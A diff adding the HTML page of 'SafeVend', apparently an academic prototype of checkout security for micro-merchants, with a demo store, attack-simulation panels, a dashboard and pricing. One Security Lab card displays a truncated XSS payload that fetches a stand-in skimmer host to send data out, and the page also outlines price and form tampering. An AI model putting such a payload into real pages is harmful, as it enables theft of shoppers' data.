@@ -1,0 +1,1048 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SafeVend — Plug-and-Play Security for Micro-Merchants</title>
+  <meta name="description" content="Affordable e-commerce security, simplified for small businesses. Protects micro-merchant checkout from price tampering, bot requests, and malicious inputs.">
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+  <!-- ACADEMIC CEC PROJECT BANNER -->
+  <aside class="top-bar-academic" aria-label="Academic Project Header">
+    <div class="academic-tag">
+      <span class="badge-cec">CEC CYBERSECURITY PROTOTYPE</span>
+      <span>SafeVend Research Project — Local Simulation Sandbox</span>
+    </div>
+    <div class="top-bar-sdgs">
+      <span class="sdg-pill sdg-8">
+        <strong>SDG 8</strong> Decent Work & Economic Growth
+      </span>
+      <span class="sdg-pill sdg-12">
+        <strong>SDG 12</strong> Responsible Consumption
+      </span>
+    </div>
+  </aside>
+
+  <!-- PERSISTENT MAIN NAVIGATION / HEADER -->
+  <header class="main-header">
+    <div class="header-container">
+      <a href="#home" class="brand-link" id="brand-logo" aria-label="SafeVend Home">
+        <div class="brand-shield-icon" aria-hidden="true">🛡️</div>
+        <div class="brand-text">
+          <h1>SafeVend</h1>
+          <span class="tagline">Security for Micro-Merchants</span>
+        </div>
+      </a>
+
+      <!-- Desktop Navigation Menu -->
+      <nav class="main-nav" id="main-nav-menu" aria-label="Primary Navigation">
+        <a href="#home" class="nav-link active" data-view="home">Home</a>
+        <a href="#store" class="nav-link" data-view="store">Store</a>
+        <a href="#checkout" class="nav-link" data-view="checkout">Secure Checkout</a>
+        <a href="#security-lab" class="nav-link" data-view="security-lab">Security Lab</a>
+        <a href="#dashboard" class="nav-link" data-view="dashboard">Merchant Dashboard</a>
+        <a href="#how-it-works" class="nav-link" data-view="how-it-works">How It Works</a>
+        <a href="#research" class="nav-link" data-view="research">Research</a>
+        <a href="#usp" class="nav-link" data-view="usp">USP</a>
+        <a href="#pricing" class="nav-link" data-view="pricing">Pricing</a>
+        <a href="#roadmap" class="nav-link" data-view="roadmap">Roadmap</a>
+        <a href="#about" class="nav-link" data-view="about">About</a>
+      </nav>
+
+      <!-- Action Items & Indicators -->
+      <div class="header-actions">
+        <div class="live-shield-status" title="SafeVend Client Layer Active">
+          <span class="pulse-dot"></span>
+          <span id="nav-shield-label">SafeVend Active</span>
+        </div>
+
+        <button class="cart-btn-header" id="header-cart-btn" aria-label="Open Shopping Cart">
+          <span>🛒 Cart</span>
+          <span class="cart-badge" id="header-cart-count">1</span>
+        </button>
+
+        <button class="btn-demo-tour" id="btn-start-presentation-tour">
+          <span>🎓 Presentation Demo</span>
+        </button>
+
+        <button class="mobile-menu-toggle" id="mobile-menu-btn" aria-label="Toggle Navigation Menu">
+          ☰
+        </button>
+      </div>
+    </div>
+  </header>
+
+  <!-- MAIN APP VIEWS CONTAINER -->
+  <main id="app-root">
+
+    <!-- ========================================================
+         PAGE 1: HOME / LANDING PAGE
+         ======================================================== -->
+    <section id="view-home" class="view-section active">
+      <div class="hero-section">
+        <div class="hero-grid">
+          <div class="hero-content">
+            <div class="hero-badge">
+              <span>🛡️ PLUG-AND-PLAY CYBERSECURITY LAYER</span>
+            </div>
+            <h1>
+              Cybersecurity for <br>
+              <span class="gradient-text">Every Online Seller.</span>
+            </h1>
+            <p class="hero-sub">
+              SafeVend gives micro-merchants a lightweight security layer for protecting their e-commerce checkout from common transaction and web-based threats — price tampering, form tampering, malicious input, and suspicious bot requests.
+            </p>
+            <div class="hero-cta-group">
+              <a href="#checkout" class="btn btn-primary" id="hero-cta-checkout">
+                <span>Try Secure Checkout</span>
+                <span>→</span>
+              </a>
+              <a href="#security-lab" class="btn btn-secondary" id="hero-cta-lab">
+                <span>Simulate Attacks in Lab</span>
+              </a>
+            </div>
+            <div class="hero-metrics-strip">
+              <div class="hero-metric-item">
+                <div class="val green" id="hero-stat-protected">1,241</div>
+                <div class="lbl">Protected Transactions</div>
+              </div>
+              <div class="hero-metric-item">
+                <div class="val cyan">&lt; 10ms</div>
+                <div class="lbl">Client Verification Lag</div>
+              </div>
+              <div class="hero-metric-item">
+                <div class="val">Zero</div>
+                <div class="lbl">Backend Config Needed</div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Hero Architecture Flow Visual -->
+          <div class="hero-visual-card">
+            <div class="hero-visual-header">
+              <span class="title">SafeVend Transaction Flow</span>
+              <span class="badge-sec badge-verified">✓ Engine Ready</span>
+            </div>
+            <div class="flow-diagram-vertical">
+              <div class="flow-node">
+                <div class="flow-icon blue">👤</div>
+                <div class="flow-info">
+                  <div class="label">Step 1</div>
+                  <div class="name">Customer Storefront Checkout</div>
+                </div>
+              </div>
+              <div class="flow-arrow">↓</div>
+              <div class="flow-node active-layer">
+                <div class="flow-icon cyan">🛡️</div>
+                <div class="flow-info">
+                  <div class="label">Step 2 • Active Filter</div>
+                  <div class="name">SafeVend Security Layer</div>
+                </div>
+              </div>
+              <div class="flow-arrow">↓</div>
+              <div class="flow-node verified-layer">
+                <div class="flow-icon green">✓</div>
+                <div class="flow-info">
+                  <div class="label">Step 3 • Verified</div>
+                  <div class="name">Transaction Allowed &amp; Checksum Signed</div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Why SafeVend Feature Cards -->
+      <div class="why-safevend-section">
+        <div class="container">
+          <div class="page-title-banner">
+            <h2>Why SafeVend?</h2>
+            <p>Traditional enterprise security tools are expensive, complex, and require full-time cybersecurity teams. SafeVend is built differently.</p>
+          </div>
+          <div class="why-grid">
+            <div class="why-card">
+              <div class="card-icon">⚡</div>
+              <h3>1. Plug &amp; Play</h3>
+              <p>Simple integration with minimal configuration. Micro-sellers embed a lightweight script and gain instant baseline transaction safety.</p>
+            </div>
+            <div class="why-card">
+              <div class="card-icon">💰</div>
+              <h3>2. Affordable</h3>
+              <p>Specifically designed for small and home businesses that cannot justify expensive enterprise Web Application Firewalls (WAF).</p>
+            </div>
+            <div class="why-card">
+              <div class="card-icon">🔒</div>
+              <h3>3. Transaction Protection</h3>
+              <p>Detects client-side price tampering, coupon manipulation, form parameter rewrites, and malicious script inputs in real-time.</p>
+            </div>
+            <div class="why-card">
+              <div class="card-icon">📊</div>
+              <h3>4. Merchant Visibility</h3>
+              <p>Provides clear, jargon-free security alerts and incident summaries so non-technical merchants know exactly what happened.</p>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- SDG Alignment Section -->
+      <div class="sdg-section">
+        <div class="container">
+          <div class="page-title-banner">
+            <h2>Sustainable Development Goals (SDG) Alignment</h2>
+            <p>Supporting economic growth and resilient commerce for micro-entrepreneurs.</p>
+          </div>
+          <div class="sdg-grid">
+            <div class="sdg-card">
+              <div class="sdg-num-box c-sdg8">
+                <span class="num">8</span>
+                <span class="txt">SDG</span>
+              </div>
+              <div class="sdg-info">
+                <h3>Decent Work &amp; Economic Growth</h3>
+                <p>Micro and small enterprises represent the backbone of local employment. Protecting their digital revenue from payment tampering prevents devastating fraud losses and fosters sustainable local economic prosperity.</p>
+              </div>
+            </div>
+            <div class="sdg-card">
+              <div class="sdg-num-box c-sdg12">
+                <span class="num">12</span>
+                <span class="txt">SDG</span>
+              </div>
+              <div class="sdg-info">
+                <h3>Responsible Consumption &amp; Production</h3>
+                <p>Enables local artisans, zero-waste producers, and sustainable creators to sell securely online without losing revenue to fraudulent transactions, promoting responsible local trade.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ========================================================
+         PAGE 2: STOREFRONT (CraftNest - Artisan Store)
+         ======================================================== -->
+    <section id="view-store" class="view-section">
+      <div class="container">
+        <!-- Store Banner -->
+        <div class="storefront-header">
+          <div class="store-brand">
+            <h2>CraftNest</h2>
+            <p>Handmade products from local creators &amp; independent artisans.</p>
+          </div>
+          <div class="store-security-guarantee">
+            <span class="sec-icon">🛡️</span>
+            <div class="sec-text">
+              <strong>Protected by SafeVend ✓</strong>
+              <span>Transaction &amp; Checkout Integrity Guaranteed</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Product Grid -->
+        <div class="products-grid" id="products-catalog-container">
+          <!-- Dynamically populated from SafeVendData.products -->
+        </div>
+      </div>
+    </section>
+
+    <!-- ========================================================
+         PAGE 3: SECURE CHECKOUT (THE CORE DEMO LAB)
+         ======================================================== -->
+    <section id="view-checkout" class="view-section">
+      <div class="container">
+        <div class="page-title-banner">
+          <h2>Secure Checkout Experience</h2>
+          <p>Test legitimate transactions or trigger real-time simulated attacks to evaluate SafeVend's multi-layered defense.</p>
+        </div>
+
+        <div class="checkout-grid">
+          <!-- Main Checkout Form Area -->
+          <div class="checkout-main-form">
+            <form id="checkout-form" novalidate>
+              <!-- Customer Information Section -->
+              <div class="checkout-section-block">
+                <div class="section-head-with-badge">
+                  <h3>
+                    <span>1. Customer Information</span>
+                  </h3>
+                  <span class="badge-sec badge-secure">Input Validation Active</span>
+                </div>
+
+                <div class="form-grid-2">
+                  <div class="form-group">
+                    <label for="cust-fullname">Full Name <span class="hint">(min 3 chars)</span></label>
+                    <input type="text" id="cust-fullname" class="form-input" placeholder="e.g. Priya Sharma" value="Priya Sharma" required>
+                    <span class="field-error-msg" id="err-cust-fullname"></span>
+                  </div>
+                  <div class="form-group">
+                    <label for="cust-email">Email Address <span class="hint">(order receipt)</span></label>
+                    <input type="email" id="cust-email" class="form-input" placeholder="e.g. priya.sharma@example.com" value="priya.sharma@example.com" required>
+                    <span class="field-error-msg" id="err-cust-email"></span>
+                  </div>
+                </div>
+
+                <div class="form-grid-2">
+                  <div class="form-group">
+                    <label for="cust-phone">Mobile Phone <span class="hint">(10 digits)</span></label>
+                    <input type="tel" id="cust-phone" class="form-input" placeholder="e.g. 9876543210" value="9876543210" required>
+                    <span class="field-error-msg" id="err-cust-phone"></span>
+                  </div>
+                  <div class="form-group">
+                    <label for="cust-pincode">PIN Code <span class="hint">(6 digits)</span></label>
+                    <input type="text" id="cust-pincode" class="form-input" placeholder="e.g. 560001" value="560001" maxlength="6" required>
+                    <span class="field-error-msg" id="err-cust-pincode"></span>
+                  </div>
+                </div>
+
+                <div class="form-grid-2">
+                  <div class="form-group">
+                    <label for="cust-address">Delivery Address <span class="hint">(Street / Apt)</span></label>
+                    <input type="text" id="cust-address" class="form-input" placeholder="e.g. #42, Green Park Avenue" value="#42, Green Park Avenue" required>
+                    <span class="field-error-msg" id="err-cust-address"></span>
+                  </div>
+                  <div class="form-group">
+                    <label for="cust-city">City</label>
+                    <input type="text" id="cust-city" class="form-input" placeholder="e.g. Bengaluru" value="Bengaluru" required>
+                    <span class="field-error-msg" id="err-cust-city"></span>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Payment Demo Section (NO REAL CARD DETAILS) -->
+              <div class="checkout-section-block">
+                <div class="section-head-with-badge">
+                  <h3>
+                    <span>2. Demo Payment Method</span>
+                  </h3>
+                  <span class="badge-sec badge-verified">🛡️ Tokenized Sandbox</span>
+                </div>
+
+                <div class="demo-payment-box">
+                  <div class="demo-banner-callout">
+                    <span>ℹ️</span>
+                    <span>Demo Environment — No real payment information is processed or stored.</span>
+                  </div>
+
+                  <div class="form-group">
+                    <label for="demo-card-num">Demo Card Number <span class="hint">(Simulated)</span></label>
+                    <input type="text" id="demo-card-num" class="form-input" value="4111 •••• •••• 1111" readonly>
+                  </div>
+
+                  <div class="form-grid-2">
+                    <div class="form-group">
+                      <label for="demo-expiry">Expiry Date</label>
+                      <input type="text" id="demo-expiry" class="form-input" value="12 / 28" readonly>
+                    </div>
+                    <div class="form-group">
+                      <label for="demo-cvv">Demo CVV</label>
+                      <input type="text" id="demo-cvv" class="form-input" value="888" readonly>
+                    </div>
+                  </div>
+                </div>
+
+                <!-- Primary Verification Button -->
+                <button type="button" class="btn btn-primary btn-lg" id="btn-verify-checkout" style="width: 100%;">
+                  <span>🛡️ Verify &amp; Complete Transaction</span>
+                </button>
+              </div>
+
+              <!-- Presenter Quick Attack Controls for Presentation -->
+              <div class="simulation-controls-box">
+                <div class="simulation-controls-header">
+                  <span class="title">⚡ Presenter Simulation Panel (Simulate Attacks)</span>
+                  <span class="badge-sec badge-warning">Testing Sandbox</span>
+                </div>
+                <div class="simulation-buttons-grid">
+                  <button type="button" class="btn-simulate" id="btn-sim-price-tampering">
+                    <span class="sim-name">🚨 Simulate Price Tampering</span>
+                    <span class="sim-desc">Rewrites total from ₹999 to ₹0.01</span>
+                  </button>
+                  <button type="button" class="btn-simulate" id="btn-sim-suspicious-input">
+                    <span class="sim-name">⚠️ Simulate Malicious Input (XSS)</span>
+                    <span class="sim-desc">Injects script pattern in address</span>
+                  </button>
+                  <button type="button" class="btn-simulate" id="btn-sim-bot-request">
+                    <span class="sim-name">🤖 Simulate Automated Bot Request</span>
+                    <span class="sim-desc">Rapid burst checkout velocity</span>
+                  </button>
+                  <button type="button" class="btn-simulate" id="btn-sim-form-tampering">
+                    <span class="sim-name">🛡️ Simulate Form Tampering</span>
+                    <span class="sim-desc">Injects rogue hidden recipient field</span>
+                  </button>
+                </div>
+              </div>
+            </form>
+          </div>
+
+          <!-- Checkout Sidebar -->
+          <div class="checkout-sidebar">
+            <!-- Order Summary Card -->
+            <div class="sidebar-card order-summary-card">
+              <h4>Order Summary</h4>
+              <div id="checkout-summary-items">
+                <!-- Dynamically populated from cart -->
+              </div>
+              <div class="summary-total-row">
+                <span class="lbl">Total Payable</span>
+                <span class="val" id="checkout-summary-total">₹999</span>
+              </div>
+            </div>
+
+            <!-- SafeVend Protection Features List -->
+            <div class="sidebar-card protection-feature-card">
+              <h4>
+                <span>🛡️ SafeVend Protection Active</span>
+              </h4>
+              <ul class="protection-list">
+                <li><span class="chk">✓</span> Strict client input validation</li>
+                <li><span class="chk">✓</span> Malicious injection pattern filter</li>
+                <li><span class="chk">✓</span> Authoritative price integrity check</li>
+                <li><span class="chk">✓</span> Real-time automated bot monitoring</li>
+                <li><span class="chk">✓</span> Immediate merchant dashboard alerts</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ========================================================
+         PAGE 4: MERCHANT SECURITY DASHBOARD
+         ======================================================== -->
+    <section id="view-dashboard" class="view-section">
+      <div class="container">
+        <!-- Dashboard Header Strip -->
+        <div class="dashboard-header-strip">
+          <div class="title-area">
+            <h2>SafeVend Security Center</h2>
+            <p>Real-time threat monitoring and transaction telemetry for micro-merchant CraftNest.</p>
+          </div>
+          <div class="dash-actions">
+            <button class="btn btn-secondary btn-sm" id="btn-reset-metrics">
+              <span>↻ Reset Simulation Data</span>
+            </button>
+            <a href="#security-lab" class="btn btn-primary btn-sm">
+              <span>+ Launch Attack Lab</span>
+            </a>
+          </div>
+        </div>
+
+        <!-- 4 Top Key Metrics -->
+        <div class="metrics-grid-4">
+          <div class="metric-card">
+            <div class="metric-lbl">Total Transactions</div>
+            <div class="metric-val" id="dash-metric-total">1,248</div>
+            <div class="metric-sub">Processed across all sessions</div>
+          </div>
+          <div class="metric-card card-protected">
+            <div class="metric-lbl">Protected &amp; Allowed</div>
+            <div class="metric-val" id="dash-metric-protected">1,241</div>
+            <div class="metric-sub">✓ 99.4% legitimate checkout rate</div>
+          </div>
+          <div class="metric-card card-blocked">
+            <div class="metric-lbl">Threats Blocked</div>
+            <div class="metric-val" id="dash-metric-blocked">7</div>
+            <div class="metric-sub">🚨 Automated defense triggered</div>
+          </div>
+          <div class="metric-card card-risk">
+            <div class="metric-lbl">Risk Status</div>
+            <div class="metric-val" id="dash-metric-risk">LOW</div>
+            <div class="metric-sub">Dynamic heuristic threat score</div>
+          </div>
+        </div>
+
+        <!-- Dashboard Charts Grid -->
+        <div class="charts-grid-2">
+          <!-- Chart 1: Transactions Over Time -->
+          <div class="chart-card">
+            <div class="chart-card-header">
+              <h3>Transactions &amp; Verifications Timeline</h3>
+              <div class="legend">
+                <span><span class="legend-dot" style="background:#38bdf8;"></span> Legitimate</span>
+                <span><span class="legend-dot" style="background:#ef4444;"></span> Blocked</span>
+              </div>
+            </div>
+            <div class="svg-chart-container" id="chart-timeline-container">
+              <!-- Rendered via JavaScript SVG generator -->
+            </div>
+          </div>
+
+          <!-- Chart 2: Threat Categories Distribution -->
+          <div class="chart-card">
+            <div class="chart-card-header">
+              <h3>Threats by Category</h3>
+              <span class="badge-sec badge-secure">Live Telemetry</span>
+            </div>
+            <div class="threat-categories-list" id="threat-categories-breakdown">
+              <!-- Dynamically rendered -->
+            </div>
+          </div>
+        </div>
+
+        <!-- Live Security Alerts Feed Table -->
+        <div class="alerts-card">
+          <div class="alerts-header">
+            <h3>
+              <span>🚨 Live Security Alerts Feed</span>
+              <span class="badge-sec badge-threat" id="alerts-count-badge">7 Events</span>
+            </h3>
+            <div class="alerts-filter-tabs" id="alerts-filter-group">
+              <button class="filter-tab active" data-filter="all">All Alerts</button>
+              <button class="filter-tab" data-filter="priceTampering">Price Tampering</button>
+              <button class="filter-tab" data-filter="automatedRequests">Bot Activity</button>
+              <button class="filter-tab" data-filter="suspiciousInput">Input Attacks</button>
+              <button class="filter-tab" data-filter="formTampering">Form Integrity</button>
+            </div>
+          </div>
+
+          <div class="alerts-table-wrapper">
+            <table class="alerts-table">
+              <thead>
+                <tr>
+                  <th>Alert ID &amp; Threat</th>
+                  <th>Severity</th>
+                  <th>Target Component</th>
+                  <th>Observed Value vs Baseline</th>
+                  <th>Status</th>
+                  <th>Timestamp</th>
+                  <th>Action</th>
+                </tr>
+              </thead>
+              <tbody id="alerts-table-body">
+                <!-- Dynamically populated from SafeVendSecurityEngine -->
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ========================================================
+         PAGE 5: HOW IT WORKS (GRAPHICAL ARCHITECTURE)
+         ======================================================== -->
+    <section id="view-how-it-works" class="view-section">
+      <div class="container">
+        <div class="how-it-works-hero">
+          <div class="page-title-banner">
+            <h2>How SafeVend Works</h2>
+            <p>From checkout initiation to threat mitigation: how SafeVend secures micro-merchant sales without complex server infrastructure.</p>
+          </div>
+        </div>
+
+        <div class="process-steps-container">
+          <div class="process-step-card">
+            <div class="step-num-circle">1</div>
+            <div class="step-body">
+              <h4>Customer Visits Artisan Store</h4>
+              <p>The shopper browses handcrafted artisan inventory on CraftNest and adds items (e.g. Handmade Tote Bag for ₹999) to their cart.</p>
+            </div>
+          </div>
+          <div class="step-connector-arrow">↓</div>
+
+          <div class="process-step-card">
+            <div class="step-num-circle">2</div>
+            <div class="step-body">
+              <h4>Customer Opens Secure Checkout</h4>
+              <p>The checkout interface loads with the embedded SafeVend client integrity script. Input forms and hidden attributes are fingerprinted.</p>
+            </div>
+          </div>
+          <div class="step-connector-arrow">↓</div>
+
+          <div class="process-step-card">
+            <div class="step-num-circle">3</div>
+            <div class="step-body">
+              <h4>SafeVend Validates Customer Input</h4>
+              <p>Client inputs undergo strict sanitization and pattern checking to detect XSS injection tags, SQL probing, or malformed postal formats.</p>
+            </div>
+          </div>
+          <div class="step-connector-arrow">↓</div>
+
+          <div class="process-step-card">
+            <div class="step-num-circle">4</div>
+            <div class="step-body">
+              <h4>SafeVend Verifies Transaction &amp; Price Integrity</h4>
+              <p>Submitted order totals are compared against verified catalog pricing. Any client-side price tampering (e.g., rewriting ₹999 to ₹0.01) is instantly detected.</p>
+            </div>
+          </div>
+          <div class="step-connector-arrow">↓</div>
+
+          <div class="process-step-card tampered-step">
+            <div class="step-num-circle">5</div>
+            <div class="step-body">
+              <h4>Threat Is Blocked &amp; Quarantined</h4>
+              <p>If tampering or automated burst anomalies are detected, the transaction pipeline is terminated before any payment gateway is contacted.</p>
+            </div>
+          </div>
+          <div class="step-connector-arrow">↓</div>
+
+          <div class="process-step-card">
+            <div class="step-num-circle">6</div>
+            <div class="step-body">
+              <h4>Merchant Receives Instant Plain-Language Alert</h4>
+              <p>A structured security alert with timestamp, affected component, and forensic payload difference is recorded on the Merchant Security Dashboard.</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ========================================================
+         PAGE 6: SECURITY LAB / ATTACK SIMULATION WORKBENCH
+         ======================================================== -->
+    <section id="view-security-lab" class="view-section">
+      <div class="container">
+        <div class="page-title-banner">
+          <h2>SafeVend Security Lab</h2>
+          <p>Simulate common e-commerce threats in a safe, controlled environment to inspect detections and automated defenses.</p>
+        </div>
+
+        <div class="security-lab-grid">
+          <!-- Lab Card 1: Price Tampering -->
+          <div class="lab-attack-card">
+            <div class="lab-card-header">
+              <h3>1. Price Tampering Simulation</h3>
+              <span class="badge-sec badge-threat">High Risk</span>
+            </div>
+            <p>Attackers inspect client-side DOM or modify POST payloads to alter a ₹999 product to ₹0.01 before dispatch.</p>
+            <div class="lab-visual-box">
+              <div class="line"><span class="tag">Catalog Price:</span> <span class="highlight">₹999.00</span></div>
+              <div class="line"><span class="tag">Altered Value:</span> <span class="threat">₹0.01</span></div>
+              <div class="line"><span class="tag">SafeVend Rule:</span> <span>Strict Item Price Matrix Match</span></div>
+              <div class="line"><span class="tag">Action:</span> <span class="action">TRANSACTION BLOCKED</span></div>
+            </div>
+            <button class="btn btn-danger btn-sm" id="btn-lab-attack-price">
+              <span>Execute Price Tamper Attack</span>
+            </button>
+          </div>
+
+          <!-- Lab Card 2: Form & Attribute Tampering -->
+          <div class="lab-attack-card">
+            <div class="lab-card-header">
+              <h3>2. Form Tampering Simulation</h3>
+              <span class="badge-sec badge-warning">Medium Risk</span>
+            </div>
+            <p>Malicious browser extensions or DOM tampering inject unauthorized fields or redirect checkout merchant recipient IDs.</p>
+            <div class="lab-visual-box">
+              <div class="line"><span class="tag">Baseline Hash:</span> <span class="highlight">SV-DOM-INTEGRITY-9A7F</span></div>
+              <div class="line"><span class="tag">Mutation:</span> <span class="threat">&lt;input name="override_acct"&gt;</span></div>
+              <div class="line"><span class="tag">SafeVend Rule:</span> <span>DOM Mutation &amp; Schema Integrity</span></div>
+              <div class="line"><span class="tag">Action:</span> <span class="action">SUBMISSION HALTED</span></div>
+            </div>
+            <button class="btn btn-danger btn-sm" id="btn-lab-attack-form">
+              <span>Execute Form Tamper Attack</span>
+            </button>
+          </div>
+
+          <!-- Lab Card 3: Suspicious Malicious Input (XSS/SQLi) -->
+          <div class="lab-attack-card">
+            <div class="lab-card-header">
+              <h3>3. Suspicious Input Pattern</h3>
+              <span class="badge-sec badge-threat">High Risk</span>
+            </div>
+            <p>Attackers inject cross-site scripting (XSS) payloads or SQL syntax probes into customer address and name fields.</p>
+            <div class="lab-visual-box">
+              <div class="line"><span class="tag">Input Field:</span> <span>Address Line 1</span></div>
+              <div class="line"><span class="tag">Payload:</span> <span class="threat">&lt;script&gt;fetch('https://skimmer.xyz?c=...</span></div>
+              <div class="line"><span class="tag">SafeVend Rule:</span> <span>Sanitization &amp; Regex Signature Engine</span></div>
+              <div class="line"><span class="tag">Action:</span> <span class="action">INPUT NEUTRALIZED &amp; FLAGGED</span></div>
+            </div>
+            <button class="btn btn-danger btn-sm" id="btn-lab-attack-input">
+              <span>Execute Input Injection Attack</span>
+            </button>
+          </div>
+
+          <!-- Lab Card 4: Automated Bot Request -->
+          <div class="lab-attack-card">
+            <div class="lab-card-header">
+              <h3>4. Automated Bot Burst</h3>
+              <span class="badge-sec badge-warning">Medium Risk</span>
+            </div>
+            <p>Automated headless scripts initiate rapid checkout bursts to validate stolen credentials or test card batches.</p>
+            <div class="lab-visual-box">
+              <div class="line"><span class="tag">Observed Velocity:</span> <span class="threat">14 requests / 2.8 sec</span></div>
+              <div class="line"><span class="tag">Telemetry:</span> <span>Zero pointer movement, headless header</span></div>
+              <div class="line"><span class="tag">SafeVend Rule:</span> <span>Adaptive Velocity Thresholds</span></div>
+              <div class="line"><span class="tag">Action:</span> <span class="action">BURST THROTTLED &amp; FLAGGED</span></div>
+            </div>
+            <button class="btn btn-danger btn-sm" id="btn-lab-attack-bot">
+              <span>Execute Automated Bot Burst</span>
+            </button>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ========================================================
+         PAGE 7: RESEARCH (LITERATURE REVIEW & RESEARCH GAP)
+         ======================================================== -->
+    <section id="view-research" class="view-section">
+      <div class="container">
+        <div class="page-title-banner">
+          <h2>Research Behind SafeVend</h2>
+          <p>Academic literature review and theoretical foundation supporting lightweight e-commerce security for micro-merchants.</p>
+        </div>
+
+        <!-- Prominently Styled Research Gap Section -->
+        <div class="research-gap-banner">
+          <div class="research-gap-badge">🚨 The Research Gap (2021–2025)</div>
+          <h3>Why Existing Solutions Leave Micro-Merchants Vulnerable</h3>
+          <p>
+            Existing cybersecurity techniques can provide strong protection, but many commercial solutions remain difficult, costly, or technically demanding for resource-constrained small businesses. High subscription models ($2,000–$15,000/yr), complex cloud DNS configurations, and convoluted SIEM interfaces create an accessibility barrier. <strong>SafeVend focuses specifically on simplifying essential checkout security for micro-merchants through an ultra-low-friction, plug-and-play client verification architecture.</strong>
+          </p>
+        </div>
+
+        <!-- 7 Literature Review Placeholders -->
+        <div class="page-title-banner" style="margin-bottom: 1.5rem;">
+          <h3 style="font-size: 1.5rem; font-weight: 700;">Literature Review — 2021–2025</h3>
+          <p>Verified academic literature across 7 core research themes informing SafeVend's architecture.</p>
+        </div>
+
+        <div class="research-papers-grid" id="research-papers-container">
+          <!-- Dynamically populated from SafeVendData.researchPapers -->
+        </div>
+      </div>
+    </section>
+
+    <!-- ========================================================
+         PAGE 8: USP & COMPARISON
+         ======================================================== -->
+    <section id="view-usp" class="view-section">
+      <div class="container">
+        <div class="usp-hero">
+          <div class="page-title-banner">
+            <h2>Enterprise Security Thinking. Micro-Merchant Simplicity.</h2>
+            <p>Bringing essential security protections down to the micro-scale without enterprise overhead.</p>
+          </div>
+        </div>
+
+        <!-- 4 USP Cards -->
+        <div class="usp-cards-grid">
+          <div class="usp-card">
+            <div class="usp-icon">⚡</div>
+            <h4>Zero / Low Configuration</h4>
+            <p>Embeds with a single client script. Eliminates complex DNS proxies and firewall rule writing.</p>
+          </div>
+          <div class="usp-card">
+            <div class="usp-icon">🏷️</div>
+            <h4>Affordable by Design</h4>
+            <p>Tailored specifically for micro-revenues with a free open-source tier and ultra-low-cost scaling.</p>
+          </div>
+          <div class="usp-card">
+            <div class="usp-icon">🎯</div>
+            <h4>Micro-Merchant Focused</h4>
+            <p>Purpose-built for independent creators, home businesses, and artisan sellers on lightweight templates.</p>
+          </div>
+          <div class="usp-card">
+            <div class="usp-icon">👁️</div>
+            <h4>Simple Security Visibility</h4>
+            <p>Jargon-free merchant dashboard with color-coded incident cards and plain-English threat explanations.</p>
+          </div>
+        </div>
+
+        <!-- Conceptual Comparison Table -->
+        <div class="comparison-table-wrapper">
+          <h3>Architectural Comparison</h3>
+          <p class="disclaimer">Conceptual comparison highlighting architectural philosophy and accessibility differences.</p>
+          <table class="comparison-table">
+            <thead>
+              <tr>
+                <th>Criterion</th>
+                <th>Traditional Enterprise Security</th>
+                <th class="col-safevend">SafeVend Security Layer</th>
+              </tr>
+            </thead>
+            <tbody id="comparison-table-body">
+              <!-- Dynamically populated from SafeVendData.comparisonMatrix -->
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </section>
+
+    <!-- ========================================================
+         PAGE 9: BUSINESS MODEL & PRICING
+         ======================================================== -->
+    <section id="view-pricing" class="view-section">
+      <div class="container">
+        <div class="page-title-banner">
+          <h2>Affordable E-Commerce Security Model</h2>
+          <p>Sustainable, tiered pricing designed to make cybersecurity accessible to every small business.</p>
+        </div>
+
+        <div class="pricing-grid">
+          <!-- Tier 1: Free / Open Source -->
+          <div class="pricing-card">
+            <h3>Free / Open Source</h3>
+            <div class="price-tag">₹0</div>
+            <div class="price-sub">Free forever for micro-sellers and community builders</div>
+            <ul class="pricing-features-list">
+              <li><span class="check">✓</span> Secure client checkout template</li>
+              <li><span class="check">✓</span> Real-time input validation &amp; sanitization</li>
+              <li><span class="check">✓</span> Basic client-side price integrity check</li>
+              <li><span class="check">✓</span> Local in-browser merchant dashboard</li>
+              <li><span class="check">✓</span> Community security documentation</li>
+            </ul>
+            <a href="#checkout" class="btn btn-secondary">Get Started Free</a>
+          </div>
+
+          <!-- Tier 2: Premium Subscription -->
+          <div class="pricing-card featured">
+            <div class="pricing-badge-popular">RECOMMENDED</div>
+            <h3>Premium Merchant</h3>
+            <div class="price-tag">₹199<span style="font-size: 1rem; color: var(--text-muted); font-weight: 400;">/month</span></div>
+            <div class="price-sub">Affordable monthly security subscription for growing stores</div>
+            <ul class="pricing-features-list">
+              <li><span class="check">✓</span> All Open-Source features included</li>
+              <li><span class="check">✓</span> Advanced cloud telemetry &amp; persistent logs</li>
+              <li><span class="check">✓</span> Automated instant WhatsApp &amp; SMS alerts</li>
+              <li><span class="check">✓</span> Adaptive bot mitigation &amp; rate limiting</li>
+              <li><span class="check">✓</span> Weekly store security health digest</li>
+              <li><span class="check">✓</span> Multi-store merchant support</li>
+            </ul>
+            <a href="#checkout" class="btn btn-primary">Upgrade to Premium</a>
+          </div>
+        </div>
+
+        <!-- Future Business Scaling Strategy -->
+        <div class="page-title-banner" style="margin-top: 2rem;">
+          <h3 style="font-size: 1.35rem; font-weight: 700;">Future Adoption Model</h3>
+          <p>Free Community Adoption → Value-Add Threat Intelligence → Sustainable Small-Business Scale.</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- ========================================================
+         PAGE 10: FUTURE ROADMAP
+         ======================================================== -->
+    <section id="view-roadmap" class="view-section">
+      <div class="container">
+        <div class="page-title-banner">
+          <h2>SafeVend Strategic Roadmap</h2>
+          <p>From initial university prototype to scaled multi-platform e-commerce defense.</p>
+        </div>
+
+        <div class="roadmap-timeline" id="roadmap-timeline-container">
